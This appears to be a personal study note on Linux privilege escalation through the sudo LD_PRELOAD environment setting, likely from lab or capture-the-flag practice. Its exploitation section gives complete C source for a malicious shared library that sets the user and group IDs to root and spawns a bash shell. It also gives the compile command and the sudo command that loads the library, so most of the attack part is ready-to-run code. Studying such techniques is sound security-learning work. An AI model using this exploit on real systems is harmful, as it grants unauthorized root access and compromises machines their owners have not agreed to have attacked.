# Identification
---
![[Pasted image 20250428152550.png]]
- **Preloading**: ==Preloads a shared library before anything else is loaded.== 
	- Meaning we run sudo with `LD_PRELOAD`and ==we can run it on any command that we want.== 
	- We will PRELOAD ==our own library before anything else.==

# Exploitation
---
- Make a malicious library: (`shell.c`)
  
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD"); // Unset env variable LD_PRELOAD
	setgid(0); // Set groupid to 0, i.e. root
	setuid(0); // Set userid to 0, i.e. root
	system("/bin/bash"); // Execute /bin/bash
}
```
- Compile:
	- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
	- ![[Pasted image 20250428153253.png]]
- `sudo LD_PRELOAD=~/shell.so apache2`
	- Needs **full path of `shell.so`**
	- At the end, **we need something that runs as sudo**
	- ![[Pasted image 20250428153435.png]]